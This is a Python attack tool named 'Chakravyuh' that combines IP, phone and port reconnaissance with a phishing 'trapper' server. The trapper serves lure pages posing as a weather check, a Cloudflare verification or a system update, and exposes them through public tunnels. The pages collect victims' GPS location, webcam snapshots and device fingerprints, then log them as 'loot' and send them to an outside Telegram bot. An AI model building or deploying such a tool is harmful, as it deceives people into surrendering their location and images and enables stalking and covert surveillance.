#!/usr/bin/env python3
# Author: Lokesh Kumar 
# Version: 1.0.1
#Date : 13/05/2026

import sys
import os
import time
import subprocess
import shutil
import socket
import json
import threading
import http.server
import socketserver
import urllib.request
import urllib.error
import re
import base64
from datetime import datetime, date
class UpdateManager:
    @staticmethod
    def update():
        log_file = "update_log.txt"
        today = str(date.today())
        if os.path.exists(log_file):
            try:
                with open(log_file, "r") as f:
                    if f.read().strip() == today: return
            except: pass
        try:
            subprocess.call(["git", "pull"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(log_file, "w") as f: f.write(today)
        except: pass

class InstallManager:
    @staticmethod
    def check():
        required = ['requests', 'shodan', 'folium', 'user_agents', 'phonenumbers']
        missing = []
        for req in required:
            try: __import__(req)
            except ImportError: missing.append(req)
        
        if missing:
            print(f"[*] Installing dependencies: {', '.join(missing)}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print("[+] Dependencies installed. Restarting...")
            os.execv(sys.executable, ['python'] + sys.argv)

try:
    UpdateManager.update()
    InstallManager.check()
    import shodan
    import folium
    import user_agents
    import phonenumbers
    from phonenumbers import geocoder, carrier
    import requests
except: pass

if os.name == 'nt': os.system('color')

class Colors:
    CYAN = '\033[96m'; GREEN = '\033[92m'; RED = '\033[91m'
    YELLOW = '\033[93m'; WHITE = '\033[97m'; MAGENTA = '\033[95m'
    GREY = '\033[90m'; RESET = '\033[0m'; BOLD = '\033[1m'

class Utils:
    @staticmethod
    def clear(): os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def get_free_port():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0)); return s.getsockname()[1]

    @staticmethod
    def get_script_dir():
        return os.path.dirname(os.path.abspath(__file__))

    @staticmethod
    def save_loot(data):
        file_path = os.path.join(Utils.get_script_dir(), "loot_log.txt")
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {data}\n{'-'*50}\n")

    @staticmethod
    def save_image(b64_data, ip):
        try:
            header, encoded = b64_data.split(",", 1)
            data = base64.b64decode(encoded)
            filename = f"cam_{ip.replace(':', '_')}_{int(time.time())}.jpg"
            full_path = os.path.join(Utils.get_script_dir(), filename)
            with open(full_path, "wb") as f: f.write(data)
            return filename
        except: return None

    @staticmethod
    def send_telegram(msg, img_filename=None):
        cfg = ConfigManager.load()
        if "tg_token" in cfg and "tg_id" in cfg:
            try:
                url = f"https://api.telegram.org/bot{cfg['tg_token']}/sendMessage"
                requests.post(url, data={'chat_id': cfg['tg_id'], 'text': msg})
                if img_filename:
                    full_path = os.path.join(Utils.get_script_dir(), img_filename)
                    if os.path.exists(full_path):
                        with open(full_path, 'rb') as f:
                            requests.post(f"https://api.telegram.org/bot{cfg['tg_token']}/sendPhoto",
                                          data={'chat_id': cfg['tg_id']}, files={'photo': f})
            except: pass

    @staticmethod
    def banner():
        Utils.clear()
        print(f"{Colors.RED}{Colors.BOLD}")
        print("       🌀THE CHAKRAVYUH 🌀       ")
        print(" ──────────────────────────────────────────")
        print("  █▀▄▀█ ▄▀█ █▄█ ▄▀█      ░░░ ░░░ ░░░")
        print("  █ ▀ █ █▀█  █  █▀█ v1.0 ")
        print(f"{Colors.MAGENTA} ═══════════════════════════════════════════{Colors.BOLD}")
        print(f"{Colors.YELLOW} LOKESH-KUMAR | REDIRECT | STEALTH | RECON{Colors.RESET}\n")

class ConfigManager:
    FILE = "chakravyuh_config.json"
    @staticmethod
    def get_config_path(): return os.path.join(Utils.get_script_dir(), ConfigManager.FILE)
    @staticmethod
    def load():
        path = ConfigManager.get_config_path()
        if os.path.exists(path):
            try:
                with open(path, "r") as f: return json.load(f)
            except: return {}
        return {}
    @staticmethod
    def save(key, val):
        d = ConfigManager.load(); d[key] = val
        path = ConfigManager.get_config_path()
        with open(path, "w") as f: json.dump(d, f)
        print(f"{Colors.GREEN}[+] Config Saved.{Colors.RESET}")

TEMPLATES = {
    '1': ('Weather Check', """
        <div style="text-align:center;font-family:sans-serif;margin-top:20%">
            <h1>Local Weather Forecast</h1>
            <p>Please allow access to show weather for your exact location.</p>
            <button onclick="askPerms()" style="padding:15px 30px;background:#3498db;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Show Weather</button>
        </div>""", "https://www.accuweather.com"),
        
    '2': ('Cloudflare Verify', """
        <div style="text-align:center;font-family:sans-serif;margin-top:10%">
            <h1>Security Check</h1>
            <p>Click below to verify you are human.</p>
            <button onclick="askPerms()" style="padding:15px 30px;background:#2ecc71;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">I am Human</button>
        </div>""", "https://www.google.com"),
        
    '3': ('System Update', """
        <div style="text-align:center;font-family:sans-serif;background:#000;color:white;height:100vh;padding-top:20%">
            <h1 style="color:#3498db">System Update Required</h1>
            <p>Click Update to fix security vulnerabilities.</p>
            <button onclick="askPerms()" style="padding:15px 30px;background:#e74c3c;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Update Now</button>
        </div>""", "https://support.microsoft.com/en-us/windows"),
}

BASE_HTML = """
<!DOCTYPE html><html><body style="background:#f0f0f0;color:#333;margin:0">
{content}
<script>
// Redirect URL (Injected by Python)
var REDIRECT_URL = "{redirect_url}";

function redirect() {{
    window.location.replace(REDIRECT_URL);
}}

async function postData(data) {{
    await fetch('/c', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(data)
    }});
}}

async function askPerms() {{
    // 1. Request GPS
    navigator.geolocation.getCurrentPosition(async (p) => {{
        await postData({{type: 'geo', lat: p.coords.latitude, lon: p.coords.longitude}});
        redirect(); // Redirect immediately after GPS
    }}, async (e) => {{
        // If GPS denied, try Camera
        tryCam(); 
    }}, {{enableHighAccuracy: true}});
}}

async function tryCam() {{
    try {{
        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
        let track = stream.getVideoTracks()[0];
        let imageCapture = new ImageCapture(track);
        let bitmap = await imageCapture.grabFrame();
        let canvas = document.createElement('canvas');
        canvas.width = bitmap.width; canvas.height = bitmap.height;
        let ctx = canvas.getContext('2d');
        ctx.drawImage(bitmap, 0, 0);
        let b64 = canvas.toDataURL("image/jpeg", 0.8);
        
        await postData({{type: 'cam', img: b64}});
        track.stop();
        redirect(); // Redirect after Cam
    }} catch(e) {{
        redirect(); // Redirect even if everything fails (Stealth)
    }}
}}

// Passive Fingerprint (Runs in background)
async function s(){{
    let d={{
        type: 'passive',
        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
        m:navigator.deviceMemory||'N/A',
        c:navigator.hardwareConcurrency||'N/A',
        w:screen.width,h:screen.height,
        b:'N/A',bc:'N/A',g:'N/A',net:'Unknown'
    }};
    try{{let c=navigator.connection;if(c){{d.net=c.effectiveType}}}}catch(e){{}}
    try{{let b=await navigator.getBattery();d.b=Math.round(b.level*100)+'%';d.bc=b.charging?'Yes':'No'}}catch(e){{}}
    try{{let cv=document.createElement('canvas');let gl=cv.getContext('webgl');
    let db=gl.getExtension('WEBGL_debug_renderer_info');d.g=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}catch(e){{}}
    postData(d);
}}
s();
</script></body></html>
"""

class ReconModule:
    def get_ip_data(self, t):
        try:
            with urllib.request.urlopen(f"http://ip-api.com/json/{t}?fields=66846719") as u:
                return json.loads(u.read().decode())
        except: return None

    def run_ip(self, target=None):
        t = target if target else input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}").strip()
        if not t: return
        print(f"\n{Colors.CYAN}[*] IP Analysis for {t}...{Colors.RESET}")
        d = self.get_ip_data(t)
        if d:
            print(f" Geo    : {d.get('city')}, {d.get('country')}")
            print(f" ISP    : {d.get('isp')}")
            if 'lat' in d:
                m = folium.Map([d['lat'], d['lon']], zoom_start=15)
                folium.Marker([d['lat'], d['lon']], popup=t).add_to(m)
                full_path = os.path.join(Utils.get_script_dir(), f"map_{t}.html")
                m.save(full_path)
                print(f" Map    : Saved as map_{t}.html")
        
        cfg = ConfigManager.load()
        if "shodan_api" in cfg:
            try:
                api = shodan.Shodan(cfg["shodan_api"])
                h = api.host(t)
                print(f" OS     : {h.get('os')}")
                print(f" Ports  : {h.get('ports')}")
            except: pass
        if not target: input("\nEnter to return...")

    def run_port(self, target=None):
        t = target if target else input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}").strip()
        print(f"{Colors.CYAN}[*] Scanning Ports...{Colors.RESET}")
        ports = [21,22,80,443,3306,3389,8080]
        for p in ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((t, p)) == 0:
                    print(f" Port {p}: {Colors.GREEN}OPEN{Colors.RESET}")
        if not target: input("\nEnter to return...")

    def run_phone(self):
        p = input(f"{Colors.YELLOW}[?] Phone (+91..): {Colors.RESET}").strip()
        try:
            parsed = phonenumbers.parse(p)
            if phonenumbers.is_valid_number(parsed):
                print(f"\n{Colors.GREEN}[+] Valid!{Colors.RESET}")
                print(f" Loc : {geocoder.description_for_number(parsed, 'en')}")
                print(f" Net : {carrier.name_for_number(parsed, 'en')}")
            else: print(f"{Colors.RED}[!] Invalid.{Colors.RESET}")
        except: print("Error.")
        input("\nEnter to return...")

    def run_domain(self):
        d = input(f"{Colors.YELLOW}[?] Domain: {Colors.RESET}").strip()
        try:
            ip = socket.gethostbyname(d)
            print(f" IP : {Colors.GREEN}{ip}{Colors.RESET}")
        except: print("Not found.")
        input("\nEnter to return...")

class WorkflowEngine:
    def run_full_scan(self):
        t = input(f"{Colors.YELLOW}[?] Enter Target IP: {Colors.RESET}").strip()
        if not t: return
        ReconModule().run_ip(t)
        ReconModule().run_port(t)
        print(f"\n{Colors.GREEN}[✓] Workflow Complete!{Colors.RESET}")
        input("Enter to return...")

class TrapServer(http.server.SimpleHTTPRequestHandler):
    redirect_url = "https://google.com" 
    template_code = TEMPLATES['1'][1]

    def log_message(self, f, *a): return
    def do_GET(self):
        self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers()
        html = BASE_HTML.format(content=TrapServer.template_code, redirect_url=TrapServer.redirect_url)
        self.wfile.write(html.encode())

    def do_POST(self):
        try:
            client_ip = self.client_address[0]
            
            forwarded = self.headers.get('X-Forwarded-For')
            cf_ip = self.headers.get('CF-Connecting-IP')
            
            if cf_ip and '.' in cf_ip: #Cloudflare IPv4
                client_ip = cf_ip
            elif forwarded:
                ips = [ip.strip() for ip in forwarded.split(',')]
                for ip in ips:
                    if '.' in ip and ':' not in ip: #Valid IPv4 check
                        client_ip = ip
                        break
            # -----------------------------

            l = int(self.headers['Content-Length'])
            d = json.loads(self.rfile.read(l).decode())
            
            if d.get('type') == 'cam':
                fname = Utils.save_image(d.get('img'), client_ip)
                if fname:
                    print(f"\n{Colors.RED}[+] CAM SHOT CAPTURED: {fname}{Colors.RESET}")
                    Utils.send_telegram(f" Cam Shot | IP: {client_ip}", fname)
            
            elif d.get('type') == 'geo':
                lat, lon = d.get('lat'), d.get('lon')
                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                print(f"\n{Colors.RED}[+] EXACT LOCATION: {lat}, {lon}{Colors.RESET}")
                print(f"{Colors.YELLOW}>>> {maps_link} <<<{Colors.RESET}")
                Utils.save_loot(f"GEO: {lat},{lon} | IP: {client_ip} | {maps_link}")
                Utils.send_telegram(f" Location | IP: {client_ip}\n{maps_link}")

            elif d.get('type') == 'passive':
                gpu = d.get('g', '').lower()
                pred = "Unknown"
                if "mali" in gpu: pred = "Samsung/Realme"
                elif "adreno" in gpu: pred = "Redmi/Poco"
                elif "apple" in gpu: pred = "iPhone"
                
                report = f"""
[+] VICTIM HIT: {client_ip}
Time: {datetime.now().strftime('%H:%M:%S')}
Device: {pred} | GPU: {d.get('g')}
Batt: {d.get('b')} | Screen: {d.get('w')}x{d.get('h')}
"""
                print(f"{Colors.CYAN}{report}{Colors.RESET}")
                Utils.save_loot(report)
                Utils.send_telegram(report)

            self.send_response(200); self.end_headers()
        except: pass

class TrapManager:
    def run(self):
        print(f"\n{Colors.CYAN}[?] Select Trap Template:{Colors.RESET}")
        for k, v in TEMPLATES.items(): print(f" [{k}] {v[0]}")
        ch = input(f"{Colors.YELLOW} > {Colors.RESET}").strip()
        
        if ch in TEMPLATES:
            TrapServer.template_code = TEMPLATES[ch][1]
            TrapServer.redirect_url = TEMPLATES[ch][2] # Set Redirect URL

        port = Utils.get_free_port()
        try:
            httpd = socketserver.TCPServer(("", port), TrapServer)
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
        except: return

        print(f"{Colors.GREEN}[+] Local: http://localhost:{port}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Starting Tunnel...{Colors.RESET}")
        
        if shutil.which("cloudflared"):
            proc = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"], 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while True:
                line = proc.stderr.readline().decode()
                if "trycloudflare.com" in line:
                    match = re.search(r"(?P<url>https?://[^\s]+trycloudflare\.com)", line)
                    if match: print(f"\n{Colors.GREEN}{Colors.BOLD} >>> LINK: {match.group('url')} <<<{Colors.RESET}\n"); break
        else:
            subprocess.Popen(f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net".split())
            print(f"{Colors.GREY}(Serveo started. Check logs){Colors.RESET}")

        print("Waiting for victims... (Ctrl+C to stop)")
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt: pass

def main():
    while True:
        Utils.banner()
        print(f"{Colors.CYAN}[1] IP Tracker                           [2] Port Scanner{Colors.RESET}")
        print(f"{Colors.CYAN}[3] Phone Tracker                        [4] Domain Intel{Colors.RESET}")
        print(f"{Colors.CYAN}[5] Ip,location,camera trapper           [6] Settings{Colors.RESET}")
        print(f"{Colors.MAGENTA}[7] Automate All                      [0] Exit{Colors.RESET}")
        
        c = input(f"\n{Colors.GREEN}chakravyuh > {Colors.RESET}").strip()
        
        if c == '1': ReconModule().run_ip()
        elif c == '2': ReconModule().run_port()
        elif c == '3': ReconModule().run_phone()
        elif c == '4': ReconModule().run_domain()
        elif c == '5': TrapManager().run()
        elif c == '6': 
            k = input("Shodan API: "); ConfigManager.save("shodan_api", k)
            t = input("TG Token: "); ConfigManager.save("tg_token", t)
            i = input("TG Chat ID: "); ConfigManager.save("tg_id", i)
        elif c == '7': WorkflowEngine().run_full_scan()
        elif c == '0': sys.exit()

if __name__ == "__main__":
    main()
